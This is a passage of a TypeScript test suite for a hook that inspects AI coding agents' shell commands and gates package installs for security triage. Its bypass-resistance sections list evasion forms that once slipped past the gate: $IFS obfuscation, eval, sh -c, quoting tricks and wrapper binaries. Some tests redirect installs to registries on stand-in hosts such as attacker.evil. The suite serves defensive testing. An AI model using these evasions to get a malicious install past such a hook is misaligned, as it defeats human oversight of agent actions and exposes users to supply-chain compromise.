import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  parseInstallCommand,
  decideBashGate,
  extractCommandFromHookPayload,
  explainUnverifiable,
} from "./install-gate.js";
import type { GateDeps } from "./triage-gate.js";
import type { TriageType } from "./triage.js";

describe("extractCommandFromHookPayload — per-agent wire shapes", () => {
  it("reads tool_input.command (Claude/Codex/Amazon Q/Gemini)", () => {
    assert.equal(
      extractCommandFromHookPayload({ tool_name: "Bash", tool_input: { command: "npm i x" } }),
      "npm i x",
    );
  });
  it("reads top-level command (Cursor beforeShellExecution)", () => {
    assert.equal(extractCommandFromHookPayload({ command: "pip install y" }), "pip install y");
  });
  it("reads preToolUse.parameters.command (Cline PreToolUse)", () => {
    assert.equal(
      extractCommandFromHookPayload({
        hookName: "PreToolUse",
        preToolUse: { toolName: "execute_command", parameters: { command: "npm install z" } },
      }),
      "npm install z",
    );
  });
  it("reads toolCall.args.CommandLine (Antigravity run_command)", () => {
    assert.equal(
      extractCommandFromHookPayload({
        toolCall: { name: "run_command", args: { CommandLine: "npm install evil" } },
      }),
      "npm install evil",
    );
  });
  it("reads arguments.command (Amp permissions delegate)", () => {
    assert.equal(
      extractCommandFromHookPayload({ tool: "Bash", arguments: { command: "pip install evil" } }),
      "pip install evil",
    );
  });
  it("joins array-form (bin + args)", () => {
    assert.equal(
      extractCommandFromHookPayload({ tool_input: { command: ["npm", "install", "z"] } }),
      "npm install z",
    );
  });
  it("returns '' when no command present (→ gate allows)", () => {
    assert.equal(extractCommandFromHookPayload({ preToolUse: { toolName: "read_file" } }), "");
    assert.equal(extractCommandFromHookPayload({}), "");
    assert.equal(extractCommandFromHookPayload(null), "");
  });
});

describe("parseInstallCommand — detection", () => {
  const refs = (cmd: string) => parseInstallCommand(cmd).refs;

  it("npm install / i / add → npm refs", () => {
    assert.deepEqual(refs("npm install express"), ["npm:express"]);
    assert.deepEqual(refs("npm i express"), ["npm:express"]);
    assert.deepEqual(refs("npm add express"), ["npm:express"]);
  });

  it("skips flags (npm i -g typescript)", () => {
    assert.deepEqual(refs("npm i -g typescript"), ["npm:typescript"]);
    assert.deepEqual(refs("npm install --save-dev jest"), ["npm:jest"]);
  });

  it("pnpm / yarn / bun add", () => {
    assert.deepEqual(refs("pnpm add react react-dom"), ["npm:react", "npm:react-dom"]);
    assert.deepEqual(refs("yarn add lodash@4.17.21"), ["npm:lodash@4.17.21"]); // version carried
    assert.deepEqual(refs("bun add zod"), ["npm:zod"]);
  });

  it("scoped packages keep the scope AND the pinned version", () => {
    assert.deepEqual(refs("npm install @modelcontextprotocol/sdk@1.2.3"), [
      "npm:@modelcontextprotocol/sdk@1.2.3",
    ]);
    assert.deepEqual(refs("npm i @scope/pkg"), ["npm:@scope/pkg"]); // no version → bare
  });

  it("npx / bunx execution is gated (first non-flag token)", () => {
    assert.deepEqual(refs("npx create-react-app"), ["npm:create-react-app"]);
    assert.deepEqual(refs("npx -y cowsay"), ["npm:cowsay"]);
    assert.deepEqual(refs("bunx vite"), ["npm:vite"]);
  });

  it("a plain npx/bunx positional is tracked as a local-.bin shadow candidate", () => {
    assert.deepEqual(parseInstallCommand("npx tsc --noEmit").runnerBinCandidates, ["tsc"]);
    assert.deepEqual(parseInstallCommand("bunx vite build").runnerBinCandidates, ["vite"]);
    // a -p/--package REPLACE target is not locally shadowable — npx always fetches it
    assert.deepEqual(parseInstallCommand("npx -p evil cowsay").runnerBinCandidates, []);
    // installer-style adds are not runner shadow candidates either
    assert.deepEqual(parseInstallCommand("npm install tsc").runnerBinCandidates, []);
  });

  it("pip / pip3 / pipx / uv / python -m pip", () => {
    assert.deepEqual(refs("pip install requests"), ["pip:requests"]);
    assert.deepEqual(refs("pip3 install Flask>=2.0"), ["pip:Flask>=2.0"]); // version spec carried
    assert.deepEqual(refs("pipx install black"), ["pip:black"]);
    assert.deepEqual(refs("uv add httpx"), ["pip:httpx"]);
    assert.deepEqual(refs("uv pip install numpy"), ["pip:numpy"]);
    assert.deepEqual(refs("python -m pip install pandas"), ["pip:pandas"]);
    assert.deepEqual(refs("python3 -m pip install scipy"), ["pip:scipy"]);
  });

  it("pip extras keep just the name", () => {
    assert.deepEqual(refs("pip install 'requests[security]'".replace(/'/g, "")), ["pip:requests"]);
  });

  it("bare reinstall (no package args) is NOT an install", () => {
    assert.equal(parseInstallCommand("npm install").isInstall, false);
    assert.equal(parseInstallCommand("yarn").isInstall, false);
    assert.equal(parseInstallCommand("pnpm install").isInstall, false);
    assert.equal(parseInstallCommand("npm ci").isInstall, false);
  });

  it("local targets are ignored (user's own code)", () => {
    assert.deepEqual(parseInstallCommand("npm i ./local-pkg").refs, []);
    assert.deepEqual(parseInstallCommand("pip install -e .").refs, []);
    assert.deepEqual(parseInstallCommand("pip install ./dist/foo.whl").refs, []);
    assert.deepEqual(parseInstallCommand("npm i ../sibling").refs, []);
  });

  it("chained commands gate every install", () => {
    const p = parseInstallCommand("npm i a && pip install b ; npx c");
    assert.deepEqual(p.refs.sort(), ["npm:a", "npm:c", "pip:b"]);
  });

  it("dedups repeated targets", () => {
    assert.deepEqual(refs("npm i express express"), ["npm:express"]);
  });

  it("out-of-scope ecosystems pass through (not flagged)", () => {
    assert.equal(parseInstallCommand("cargo add serde").isInstall, false);
    assert.equal(parseInstallCommand("go install x@latest").isInstall, false);
    assert.equal(parseInstallCommand("gem install rails").isInstall, false);
    assert.equal(parseInstallCommand("brew install jq").isInstall, false);
  });

  it("non-install commands are ignored", () => {
    assert.equal(parseInstallCommand("git status").isInstall, false);
    assert.equal(parseInstallCommand("ls -la && echo hi").isInstall, false);
    assert.equal(parseInstallCommand("npm run build").isInstall, false);
    assert.equal(parseInstallCommand("npm test").isInstall, false);
  });

  it("fail-closed: an in-scope install with an unreducible target is unverifiable", () => {
    const p = parseInstallCommand("npm install git+https://github.com/evil/pkg");
    assert.equal(p.isInstall, true);
    assert.equal(p.refs.length, 0);
    assert.equal(p.unverifiable.length, 1);
  });

  it("handles empty / garbage input", () => {
    assert.equal(parseInstallCommand("").isInstall, false);
    // @ts-expect-error intentional bad input
    assert.equal(parseInstallCommand(undefined).isInstall, false);
  });
});

// Adversarial bypasses found in the deep security pass — each defeated every
// matcher before the fix and let an untriaged install through. Regression-locked.
describe("parseInstallCommand — bypass resistance (security)", () => {
  it("CRIT-1: a leading env-var assignment does not hide the install", () => {
    // `A=1 npm i evil` tokenized to t[0]="A=1" → no matcher fired → ALLOWED.
    assert.deepEqual(parseInstallCommand("A=1 npm i evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("FOO=bar BAZ=2 pip install evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("env X=1 npm i evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("sudo npm i evil").refs, ["npm:evil"]);
  });

  it("CRIT-REGISTRY: a registry/index redirect is fail-closed (triage-PASS-while-installing-evil bypass)", () => {
    // env-var redirects → the triaged NAME isn't what installs
    for (const cmd of [
      "npm_config_registry=http://attacker.evil/ npm i lodash",
      "NPM_CONFIG_REGISTRY=http://attacker.evil/ npm i lodash",
      "PIP_INDEX_URL=http://attacker.evil/ pip install requests",
      "PIP_EXTRA_INDEX_URL=http://attacker.evil/ pip install requests",
      "UV_INDEX_URL=http://attacker.evil/ pip install requests",
    ]) {
      const p = parseInstallCommand(cmd);
      assert.equal(p.isInstall, true, cmd);
      assert.ok(
        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
        `must be unverifiable: ${cmd}`,
      );
    }
    // flag-form redirects (equals and separate value), npm + pip
    for (const cmd of [
      "npm i lodash --registry=http://attacker.evil/",
      "npm i lodash --registry http://attacker.evil/",
      "pip install requests -i http://attacker.evil/",
      "pip install requests --index-url http://attacker.evil/",
    ]) {
      const p = parseInstallCommand(cmd);
      assert.ok(
        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
        `must be unverifiable: ${cmd}`,
      );
    }
    // indirect + less-obvious redirect vectors (2nd red-team pass)
    for (const cmd of [
      "YARN_NPM_REGISTRY_SERVER=http://attacker.evil/ yarn add lodash", // yarn berry
      "NPM_CONFIG_USERCONFIG=/tmp/evil.npmrc npm i lodash", // attacker .npmrc
      "NPM_CONFIG_GLOBALCONFIG=/tmp/evil.npmrc npm i lodash",
      "PIP_CONFIG_FILE=/tmp/evil.conf pip install requests", // attacker pip.conf
      "env 'npm_config_@scope:registry=http://attacker.evil/' npm i @scope/pkg", // scoped
    ]) {
      const p = parseInstallCommand(cmd);
      assert.ok(
        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
        `must be unverifiable: ${cmd}`,
      );
    }
  });

  it("CRIT-REGISTRY: a special-char env assignment can't hide the install entirely", () => {
    // `env 'a:b=1' npm i evil` left `a:b=1` as argv[0] before the broadened strip,
    // so NO matcher fired and the install was fully undetected (worst case).
    assert.deepEqual(parseInstallCommand("env 'a:b=1' npm i evil".replace(/'/g, "")).refs, [
      "npm:evil",
    ]);
    assert.equal(parseInstallCommand("a:b=1 npm i evil").isInstall, true);
  });

  it("CRIT-REGISTRY: the canonical public registry/index is NOT flagged (no false-positive)", () => {
    assert.deepEqual(
      parseInstallCommand("npm_config_registry=https://registry.npmjs.org npm i lodash").refs,
      ["npm:lodash"],
    );
    assert.deepEqual(
      parseInstallCommand("npm_config_registry=https://registry.npmjs.org npm i lodash")
        .unverifiable,
      [],
    );
    assert.deepEqual(
      parseInstallCommand("pip install requests -i https://pypi.org/simple").unverifiable,
      [],
    );
  });

  it("HIGH-SHELL: leading shell keywords / grouping / eval don't hide the install", () => {
    assert.deepEqual(parseInstallCommand("if true; then npm i evil; fi").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("then npm i evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("{ npm i evil ; }").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("for x in 1; do pip install evil; done").refs, [
      "pip:evil",
    ]);
    assert.deepEqual(parseInstallCommand("eval 'npm i evil'").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('eval "pip install evil"').refs, ["pip:evil"]);
  });

  it("HIGH-BG: an install after a background `&` / `|&` is still detected", () => {
    assert.deepEqual(parseInstallCommand(": & npm i evil".replace(/:/, "echo hi")).refs, [
      "npm:evil",
    ]);
    assert.deepEqual(parseInstallCommand("echo hi & npm install evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("true |& npm i evil").refs, ["npm:evil"]);
  });

  it("CRIT-2: package runners (npm exec / pnpm dlx / yarn dlx / bun x) are gated", () => {
    assert.deepEqual(parseInstallCommand("npm exec evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("pnpm dlx evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("yarn dlx evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("bun x evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("pnpm exec evil").refs, ["npm:evil"]);
  });

  it("CRIT-3: a remote tarball URL is unverifiable (fail-closed), not 'local'", () => {
    const p = parseInstallCommand("npm install https://evil.example/pkg.tgz");
    assert.equal(p.isInstall, true);
    assert.deepEqual(p.refs, []);
    assert.equal(p.unverifiable.length, 1, "remote .tgz must NOT be dropped as a local target");
    // a genuinely local tarball/wheel path is still ignored
    assert.deepEqual(parseInstallCommand("pip install ./dist/foo.whl").refs, []);
    assert.deepEqual(parseInstallCommand("npm i ./pkg.tgz").refs, []);
  });

  it("HIGH-1: an install hidden in a subshell / -c arg is still detected", () => {
    assert.deepEqual(parseInstallCommand("sh -c 'npm i evil'").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('bash -c "pip install evil"').refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("echo $(npm i evil)").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("x=`pip install evil`").refs, ["pip:evil"]);
  });

  it("quoted package names are handled (no false-positive block)", () => {
    assert.deepEqual(parseInstallCommand("npm i 'express'").refs, ["npm:express"]);
    assert.deepEqual(parseInstallCommand('npm i "lodash@4"').refs, ["npm:lodash@4"]);
  });

  it("carries the pinned version/tag onto the ref so triage checks THAT version (B2)", () => {
    const refs = (c: string) => parseInstallCommand(c).refs;
    // a clean `latest` can hide a yanked/malicious pinned version — the ref must carry it
    assert.deepEqual(refs("npm i evil@1.2.3"), ["npm:evil@1.2.3"]);
    assert.deepEqual(refs("npm i left-pad@0.0.3 react@18"), ["npm:left-pad@0.0.3", "npm:react@18"]);
    assert.deepEqual(refs("npm i foo@next"), ["npm:foo@next"]); // dist-tag carried
    assert.deepEqual(refs("pip install requests==2.0.0"), ["pip:requests==2.0.0"]);
    assert.deepEqual(refs("npx create-react-app@5 myapp"), ["npm:create-react-app@5"]); // runner
    assert.deepEqual(refs("npm create vite@4 app"), ["npm:create-vite@4"]); // initiator + version
    // no version → bare name (unchanged)
    assert.deepEqual(refs("npm i express"), ["npm:express"]);
  });

  it("a known repo-fetcher RUNNER also triages the repo it was told to fetch", () => {
    const refs = (c: string) => parseInstallCommand(c).refs;
    assert.deepEqual(refs("npx skills@latest add mattpocock/skills -g -a codex -s * -y --copy"), [
      "npm:skills@latest",
      "github:mattpocock/skills",
    ]);
    assert.deepEqual(refs("npx skills add owner/repo"), ["npm:skills", "github:owner/repo"]);
    // no repo-shaped arg → just the wrapper package, unchanged behavior
    assert.deepEqual(refs("npx skills list"), ["npm:skills"]);
  });

  it("the repo-fetcher check is scoped to the allowlist — no false positives elsewhere", () => {
    const refs = (c: string) => parseInstallCommand(c).refs;
    // an unrelated npx tool taking an owner/repo-shaped positional is NOT treated as a fetch
    assert.deepEqual(refs("npx cowsay hello/world"), ["npm:cowsay"]);
    // an npm SCOPE (@scope/name) after the package must never be misread as owner/repo
    assert.deepEqual(refs("npx skills add @scope/name"), ["npm:skills"]);
  });

  it("an npm alias/protocol spec is fail-closed, not triaged as the innocent name (B2)", () => {
    // `lodash-x@npm:express@4` INSTALLS express but names lodash-x — must NOT triage lodash-x.
    for (const cmd of [
      "npm i lodash-x@npm:express@4",
      "npm i foo@git+ssh://h/r",
      "npm i a@file:./x",
    ]) {
      const p = parseInstallCommand(cmd);
      assert.equal(p.refs.length, 0, cmd);
      assert.equal(p.unverifiable.length, 1, cmd);
    }
    // a `v`-prefixed version is still carried (triage strips the v and resolves it)
    assert.deepEqual(parseInstallCommand("npm i evil@v1.2.3").refs, ["npm:evil@v1.2.3"]);
  });
});

describe("parseInstallCommand — sweep hardening (bypass closes)", () => {
  const gated = (cmd: string) => {
    const p = parseInstallCommand(cmd);
    return p.isInstall && (p.refs.length > 0 || p.unverifiable.length > 0);
  };

  it("intra-word quoting no longer hides the binary/subcommand", () => {
    assert.deepEqual(parseInstallCommand('n"p"m install evil').refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('npm i"nstall" evil').refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("np'm' i evil").refs, ["npm:evil"]);
  });

  it("path- and backslash-qualified package managers are matched (basename)", () => {
    assert.deepEqual(parseInstallCommand("/usr/bin/npm install evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("./node_modules/.bin/pnpm add evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("\\npm install evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("/usr/bin/sudo /usr/bin/npm i evil").refs, ["npm:evil"]);
  });

  it("process substitution and here-strings are recursed", () => {
    assert.deepEqual(parseInstallCommand("cat <(npm install evil)").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("diff <(npm i evil) /dev/null").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('bash <<< "npm i evil"').refs, ["npm:evil"]);
  });

  it("fetch-and-run verbs are covered (init/create/uvx/uv tool/pipx run/npm x)", () => {
    assert.deepEqual(parseInstallCommand("npm init evil").refs, ["npm:create-evil"]);
    assert.deepEqual(parseInstallCommand("npm create evil").refs, ["npm:create-evil"]);
    assert.deepEqual(parseInstallCommand("yarn create evil").refs, ["npm:create-evil"]);
    assert.deepEqual(parseInstallCommand("npm x evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("uvx evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("uv tool install evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("uv tool run evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("pipx run evil").refs, ["pip:evil"]);
  });

  it("builtin wrapper is stripped", () => {
    assert.deepEqual(parseInstallCommand("builtin npm i evil").refs, ["npm:evil"]);
  });

  it("xargs-stdin and $VAR-indirected installs fail closed (unverifiable)", () => {
    const x = parseInstallCommand("echo evil | xargs npm i");
    assert.equal(x.isInstall, true);
    assert.ok(x.unverifiable.includes("xargs-stdin-install"));
    const v = parseInstallCommand("PM=npm; $PM install evil");
    assert.equal(v.isInstall, true);
    assert.ok(v.unverifiable.some((u) => u.startsWith("indirect-bin:")));
    assert.ok(gated("echo evil | xargs npm i") && gated("PM=npm; $PM install evil"));
  });

  it("CRITICAL: a manager flag BEFORE the subcommand no longer hides the install", () => {
    // `npm -g install evil` shifted the verb past the fixed-index matchers → allowed.
    assert.deepEqual(parseInstallCommand("npm -g install evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("npm --global i evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("sudo npm -g install evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("pnpm -g add evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("yarn --verbose add evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("pip -q install evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("pip --disable-pip-version-check install evil").refs, [
      "pip:evil",
    ]);
    assert.deepEqual(parseInstallCommand("uv --quiet add evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("python -m pip -q install evil").refs, ["pip:evil"]);
    // structural `python -m pip` still works after flag-compaction
    assert.deepEqual(parseInstallCommand("python -m pip install pandas").refs, ["pip:pandas"]);
  });

  it("a flag-form registry redirect (equals form) is caught + userconfig/globalconfig", () => {
    for (const cmd of [
      "npm --registry=http://evil.com install express",
      "npm i express --userconfig=./evil.npmrc",
      "npm i express --globalconfig=/tmp/evil.npmrc",
    ]) {
      const p = parseInstallCommand(cmd);
      assert.equal(p.isInstall, true, cmd);
      assert.ok(
        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
        cmd,
      );
    }
  });

  it("gates the -p/--package/--spec/--from package, not the run-command (runner)", () => {
    assert.deepEqual(parseInstallCommand("npx --package=evil somecmd").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("npx -p evil somecmd").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("npm exec --package=evil -- somecmd").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("pnpm dlx --package evil somecmd").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("uvx --from=evil cmd").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("pipx run --spec=evil cmd").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("uv tool run --from evil cmd").refs, ["pip:evil"]);
  });

  it("covers pip wheel/download and poetry/pdm add (PyPI code execution)", () => {
    assert.deepEqual(parseInstallCommand("pip wheel evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("pip download evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("poetry add evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("pdm add evil").refs, ["pip:evil"]);
  });

  it("fails closed on a command-substitution binary", () => {
    for (const cmd of ["$(which npm) i evil", "`which npm` i evil"]) {
      const p = parseInstallCommand(cmd);
      assert.equal(p.isInstall, true, cmd);
      assert.ok(
        p.unverifiable.some((u) => u.startsWith("indirect-bin:")),
        cmd,
      );
    }
    // a var-PREFIXED real path is NOT dynamic → no false positive
    assert.equal(gated("$HOME/bin/mytool run build"), false);
  });

  it("does NOT over-trigger: comments, requirement files, and runner args", () => {
    // trailing comment stripped — only the real package is triaged, no bogus refs
    assert.deepEqual(parseInstallCommand("npm i react # installs react").refs, ["npm:react"]);
    // -r/-e file operands are not packages
    const r = parseInstallCommand("pip install -r requirements.txt");
    assert.deepEqual(r.refs, []);
    assert.deepEqual(r.unverifiable, []);
    // a runner's trailing args are NOT packages (only the fetched tool is)
    assert.deepEqual(parseInstallCommand("npx cowsay moo").refs, ["npm:cowsay"]);
    assert.deepEqual(parseInstallCommand("npm create vite myapp").refs, ["npm:create-vite"]);
  });
});

describe("parseInstallCommand — round-3 bypass closes", () => {
  const gated = (cmd: string) => {
    const p = parseInstallCommand(cmd);
    return p.isInstall && (p.refs.length > 0 || p.unverifiable.length > 0);
  };

  it("uv run --with fetches a package; a plain uv run script does not", () => {
    // `--with` installs+executes an arbitrary PyPI package before the script runs.
    assert.deepEqual(parseInstallCommand("uv run --with evil script.py").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("uv run --with=evil script.py").refs, ["pip:evil"]);
    // the positional is a LOCAL script, never gated; no --with → not an install at all.
    const plain = parseInstallCommand("uv run script.py");
    assert.equal(plain.isInstall, false);
    assert.deepEqual(plain.refs, []);
  });

  it("yarn global add|install is matched (verb at index 2)", () => {
    assert.deepEqual(parseInstallCommand("yarn global add evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("yarn global install evil").refs, ["npm:evil"]);
  });

  it("glued python -mpip / -m=pip is expanded and gated", () => {
    assert.deepEqual(parseInstallCommand("python -mpip install evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("python3 -mpip install evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("python -m=pip install evil").refs, ["pip:evil"]);
  });

  it("runner --with adds a SECOND fetched package (order-independent)", () => {
    // both the tool AND the --with package are fetched — gate both, whatever the order.
    assert.deepEqual(parseInstallCommand("uvx --with evil sometool").refs, [
      "pip:sometool",
      "pip:evil",
    ]);
    assert.deepEqual(parseInstallCommand("uvx sometool --with evil").refs, [
      "pip:sometool",
      "pip:evil",
    ]);
  });

  it("npm install-test|it and update|upgrade with a named package are gated", () => {
    assert.deepEqual(parseInstallCommand("npm install-test evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("npm it evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("npm update left-pad").refs, ["npm:left-pad"]);
    assert.deepEqual(parseInstallCommand("npm upgrade left-pad").refs, ["npm:left-pad"]);
    // bare update (no package) reinstalls declared deps → not an add
    assert.equal(parseInstallCommand("npm update").isInstall, false);
  });

  it("bare reinstall + registry redirect fails closed (no named package)", () => {
    // `npm i --registry evil` pulls attacker tarballs even with no package argument.
    const p = parseInstallCommand("npm i --registry evil-pkg");
    assert.equal(p.isInstall, true);
    assert.ok(p.unverifiable.some((u) => u.startsWith("alt-registry:")));
    assert.deepEqual(p.refs, []);
    // a truly bare reinstall is still benign
    assert.equal(parseInstallCommand("npm i").isInstall, false);
    assert.equal(parseInstallCommand("npm ci").isInstall, false);
  });

  it("does NOT false-positive on an install phrase in a non-shell -c argument", () => {
    // `-c` is only a shell script when a shell binary precedes it; an unrelated command's
    // quoted arg that merely contains `-c`/an install phrase must not be gated.
    assert.equal(gated('git commit -m "used the -c flag today"'), false);
    assert.equal(gated('git commit -m "npm install evil"'), false);
    // a real shell -c IS still recursed into
    assert.deepEqual(parseInstallCommand('bash -c "npm i evil"').refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("sh -c 'pip install evil'").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand('bash -euo pipefail -c "npm i evil"').refs, ["npm:evil"]);
  });
});

describe("parseInstallCommand — round-4 bypass closes", () => {
  it("a -c glued into a shell short-flag cluster is still recursed (bash -lc / -xc / -cl)", () => {
    // `bash -lc '…'` (login) is the canonical cron/CI form — must not slip the gate.
    for (const cmd of [
      'bash -lc "npm i evil"',
      'sh -xc "npm i evil"',
      'bash -ic "npm i evil"',
      'sh -uxc "npm i evil"',
      'bash -cl "npm i evil"',
      '/usr/bin/env -S bash -lc "npm i evil"',
    ]) {
      assert.deepEqual(parseInstallCommand(cmd).refs, ["npm:evil"], cmd);
    }
    // still NOT a shell invocation → not gated
    assert.equal(parseInstallCommand('git commit -m "use -c flag"').isInstall, false);
    assert.equal(parseInstallCommand("git commit -c HEAD").isInstall, false);
  });

  it("an ANSI-C / locale $'…' shell -c argument is recursed", () => {
    assert.deepEqual(parseInstallCommand("bash -c $'npm i evil'").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('bash -c $"pip install evil"').refs, ["pip:evil"]);
  });

  it("npm ci|clean-install with a registry redirect fails closed; bare ci is benign", () => {
    for (const cmd of ["npm ci --registry evil", "npm clean-install --registry evil"]) {
      const p = parseInstallCommand(cmd);
      assert.equal(p.isInstall, true, cmd);
      assert.ok(
        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
        cmd,
      );
    }
    assert.equal(parseInstallCommand("npm ci").isInstall, false);
    assert.equal(parseInstallCommand("npm clean-install").isInstall, false);
  });

  it("pip requirement-flag skipping does NOT eat an npm/yarn positional package", () => {
    // `-r`/`-c`/`-e` are pip file-flags; on npm they aren't valueless-consuming, so the
    // package after them must still be gated (previously dropped by the global compactor).
    assert.deepEqual(parseInstallCommand("npm i -e evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("npm i -c evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("npm i -r evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("yarn add -e evil").refs, ["npm:evil"]);
    // pip requirement files are still correctly skipped (not mis-triaged as packages)
    const r = parseInstallCommand("pip install -r requirements.txt");
    assert.deepEqual(r.refs, []);
    assert.deepEqual(r.unverifiable, []);
  });
});

describe("parseInstallCommand — round-5 bypass closes", () => {
  it("$IFS / ${IFS} whitespace obfuscation is normalized before tokenizing", () => {
    // `${IFS}` expands to whitespace, so this really runs `npm i evil`.
    assert.deepEqual(parseInstallCommand("npm${IFS}i${IFS}evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("npm${IFS}install${IFS}evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("pip${IFS}install${IFS}evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("npm$IFS'i'$IFS'evil'").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("X=1 npm${IFS}i${IFS}evil").refs, ["npm:evil"]);
    // even nested inside a shell -c
    assert.deepEqual(parseInstallCommand("sh -c 'npm${IFS}i${IFS}evil'").refs, ["npm:evil"]);
    // a different variable ($IFS2) is NOT collapsed
    assert.equal(parseInstallCommand("npm$IFS2i").isInstall, false);
  });

  it("$IFS parameter-expansion forms (${IFS:0:1}, ${IFS%%x}) also word-split", () => {
    assert.deepEqual(parseInstallCommand("npm${IFS:0:1}i${IFS:0:1}evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("npm${IFS%%x}i${IFS%%x}evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("npm${IFS#}i${IFS#}evil").refs, ["npm:evil"]);
    // a benign `$IFS` mention is not a false positive
    assert.equal(parseInstallCommand("echo $IFS variable").isInstall, false);
  });

  it("corepack wrapper is stripped so the real package manager is gated", () => {
    assert.deepEqual(parseInstallCommand("corepack pnpm add evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("corepack yarn add evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("corepack npm install evil").refs, ["npm:evil"]);
    // corepack's own subcommands are not installs
    assert.equal(parseInstallCommand("corepack enable").isInstall, false);
    assert.equal(parseInstallCommand("corepack install").isInstall, false);
  });

  it("corepack version-pinned dispatch (pnpm@9) resolves to the real manager", () => {
    // `corepack pnpm@9 add evil` leaves argv0 `pnpm@9` after the wrapper strip; binBase now
    // drops the @version so the matcher fires.
    assert.deepEqual(parseInstallCommand("corepack pnpm@9 add evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("corepack yarn@1.22.19 add evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("corepack npm@10 i evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("corepack pnpm@8 dlx evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("sudo corepack pnpm@latest add evil").refs, ["npm:evil"]);
    // version-pinned + registry redirect still fails closed on the redirect
    const redir = parseInstallCommand("corepack pnpm@9 add evil --registry http://evil");
    assert.equal(redir.isInstall, true);
    assert.ok(redir.unverifiable.some((u) => u.startsWith("alt-registry:")));
    // benign version-pinned management commands are NOT installs
    assert.equal(parseInstallCommand("corepack use pnpm@9").isInstall, false);
    assert.equal(parseInstallCommand("corepack prepare pnpm@9 --activate").isInstall, false);
    // argv0 @-strip is bin-only; a scoped/versioned PACKAGE keeps scope AND pinned version
    assert.deepEqual(parseInstallCommand("npm i @scope/pkg@1").refs, ["npm:@scope/pkg@1"]);
  });

  it("version-pinned exec -c recurses the shell string (corepack pnpm@9 exec -c)", () => {
    // regression: the @version strip made the segment matcher suppress the positional, so the
    // nestedCommands exec-call recursion must also allow @version or the string is never seen.
    for (const cmd of [
      'corepack pnpm@9 exec -c "npm i evil"',
      'corepack pnpm@9.1.0 exec -c "npm i evil"',
      'corepack yarn@1 exec -c "npm i evil"',
      'pnpm@9 exec -c "npm i evil"',
      'bun@1 x -c "npm i evil"',
    ]) {
